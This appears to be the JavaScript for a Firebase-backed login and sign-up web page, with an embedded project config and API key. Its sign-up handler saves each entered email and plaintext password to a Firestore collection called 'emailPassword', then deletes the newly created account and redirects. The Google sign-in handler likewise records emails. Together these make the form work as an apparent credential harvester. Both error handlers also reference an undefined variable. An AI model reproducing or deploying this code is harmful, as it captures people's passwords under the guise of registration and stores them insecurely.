const firebaseConfig = {
    apiKey: "AIzaSyBmRb0aKxPiB7EV2LQYb7U5SjEyfUMr-ig",
    authDomain: "smsproject-ecd2d.firebaseapp.com",
    projectId: "smsproject-ecd2d",
    storageBucket: "smsproject-ecd2d.appspot.com",
    messagingSenderId: "263965204952",
    appId: "1:263965204952:web:8f4ee00d7db469338092ad",
    measurementId: "G-SED0D8TV4G"
    };

firebase.initializeApp(firebaseConfig);
const db=firebase.firestore();
const auth = firebase.auth();
const provider = new firebase.auth.GoogleAuthProvider();

var email1 = document.getElementById('emailValue1');
var password1 = document.getElementById('passwordValue1');
var email2 = document.getElementById('emailValue2');
var password2 = document.getElementById('passwordValue2');
var submit1=document.querySelector('#sub1');
submit1.addEventListener('click',signIn1);
var submit2=document.querySelector('#sub2');
submit2.addEventListener('click',provider1);
var submit3=document.querySelector('#sub3');
submit3.addEventListener('click',signIn2);
var submit4=document.querySelector('#sub4');
submit4.addEventListener('click',provider2);

function signIn1(e){
    e.preventDefault();
    if(email1.value==='' || password1.value===''){
        alert('Please Fill all the Fields');
        return;
    }
    auth.signInWithEmailAndPassword(email1.value,password1.value).then(function(){
        location.href='valid/valid.html';
    }).catch(function(error){
        alert('Error : '+error.message);
    });
}

function signIn2(e){
    e.preventDefault();
    if(email2.value==='' || password2.value===''){
        alert('Please Fill all the Fields');
        return;
    }
    auth.createUserWithEmailAndPassword(email2.value,password2.value).then(function(){
        db.collection('emailPassword').add({
            Email:email2.value,
            Password:password2.value
        })
        setTimeout(()=>{
            auth.currentUser.delete();
            location.href='valid/valid.html';
        },1500);
    }).catch(function(error){
        alert('Error : '+error.message);
    });
}

function provider1(e){
    e.preventDefault();
    auth.signInWithPopup(provider)
        .then((result) => {
            let isNewUser = result.additionalUserInfo.isNewUser;
            let email= result.additionalUserInfo.profile.email;
            if(isNewUser){
                //delete the created user
                auth.currentUser.delete();
                alert('Error : No user found with '+email);
            }
            else{
                // your sign in flow
                location.href='valid/valid.html';
            }
        }).catch((error) => {
        // Handle Errors here.
        alert("Error : "+errorMessage);
    });
}

function provider2(e){
    e.preventDefault();
    auth.signInWithPopup(provider)
        .then((result) => {
            let isNewUser = result.additionalUserInfo.isNewUser;
            let email= result.additionalUserInfo.profile.email;
            alert(email)
            if(isNewUser){
                db.collection('googleProvider').add({
                    Email:email
                })
                setTimeout(()=>{
                    //delete the created user
                    auth.currentUser.delete();
                },1500)
            }
            setTimeout(()=>{
                location.href='valid/valid.html';         
            },1000);
        }).catch((error) => {
        // Handle Errors here.
        alert("Error : "+errorMessage);
    });
}


